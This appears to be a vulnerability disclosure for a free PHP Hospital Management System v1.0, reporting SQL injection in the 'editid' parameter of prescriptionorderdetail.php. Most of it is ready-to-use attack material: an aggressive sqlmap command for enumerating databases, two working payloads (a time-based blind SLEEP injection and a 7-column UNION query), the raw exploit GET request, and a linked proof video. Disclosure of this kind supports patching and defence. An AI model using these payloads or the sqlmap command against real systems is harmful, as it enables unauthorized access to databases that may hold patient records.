**[Hospital-Management-System v1.0-SQLi-2](https://itsourcecode.com/free-projects/php-project/hospital-management-system-in-php-with-source-code/)**
---

[Vendor](https://itsourcecode.com/author/unguardable/)
---

![Snipaste_2022-11-05_04-51-46](https://user-images.githubusercontent.com/86427788/200073296-d5708d63-0220-4285-ac3c-97f8185d5352.png)


### Description:
---
The vulnerability page is ```prescriptionorderdetail.php```

```http://your-ip/hms/prescriptionorderdetail.php```


Hospital-Management-System v1.0  

The ```editid``` parameter in the ```prescriptionorderdetail.php``` page appears to be vulnerable to SQL injection attacks.

[+]sqlmap:


python sqlmap.py -r `Your post packet.txt` --random-agent --risk=3 --level=3 -dbs --batch

[+] Payloads:

```
Parameter: editid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: editid=1' AND (SELECT 5263 FROM (SELECT(SLEEP(5)))hjmA)-- DDqR

    Type: UNION query
    Title: Generic UNION query (random number) - 7 columns
    Payload: editid=1' UNION ALL SELECT 5151,5151,5151,5151,CONCAT(0x7176787a71,0x434e63636d5548486757786e4d65674d6d465142434c634858734d575a586a51774551557a6a6375,0x71626b6271),5151,5151--
```

[+]GET request package

```
GET /HMS/prescriptionorderdetail.php?editid=1 HTTP/1.1
Host: 192.168.92.3
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
### In action:
---

![Snipaste_2022-11-05_05-01-29](https://user-images.githubusercontent.com/86427788/200074116-8f3e8d3e-59a0-48c4-ae9c-abccf232e01f.png)


### Proof and Exploit:
---

https://user-images.githubusercontent.com/86427788/200102284-a63bdf27-4527-467a-903a-eb57057e87c5.mp4



